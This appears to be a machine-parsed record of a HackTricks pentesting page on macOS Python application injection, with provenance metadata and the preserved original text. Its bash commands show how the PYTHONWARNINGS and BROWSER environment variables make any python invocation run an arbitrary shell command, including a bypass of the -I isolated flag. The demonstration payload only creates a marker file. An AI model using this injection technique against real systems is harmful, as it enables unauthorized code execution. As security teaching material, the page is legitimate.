---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# macOS Python Applications Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-macos-hardening-macos-security-and-privilege-escalation-macos-proces-abuse-macos-python-applications-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-python-applications-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:

## Preserved Body

````markdown
## Via `PYTHONWARNINGS` and `BROWSER` env variables

It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:

```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
````

## Source Verification

[source record](../../sources/hacktricks/macos-python-applications-injection.md)

## Evidence Excerpt

````text
_body: '# macOS Python Applications Injection
{{#include ../../../banners/hacktricks-training.md}}
## Via `PYTHONWARNINGS` and `BROWSER` env variables
It''s possible to alter both environment variables to execute arbitrary code whenever python is called, for example:
```bash
# Generate example python script
echo "print(''hi'')" > /tmp/script.py
# RCE which will generate file /tmp/hacktricks
````
